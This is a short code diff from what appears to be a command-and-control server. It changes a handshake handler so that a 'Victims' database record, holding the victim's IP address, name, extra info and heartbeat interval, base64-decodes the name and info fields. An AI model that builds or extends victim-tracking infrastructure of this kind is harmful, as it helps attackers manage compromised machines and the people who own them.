@@ -17,8 +17,8 @@ async function initialHandshake(req, res) {
 	} else {
 		const record = new mongodb.Victims({
 			ipv4: ipv4,
-			victimName: victimName,
-			victimAdditionalinfo: victimAdditionalinfo,
+			victimName: atob(victimName),
+			victimAdditionalinfo: atob(victimAdditionalinfo),
 			handshakeDate: currentDate,
 			heartBeatInterval: 60, // in seconds
 		});
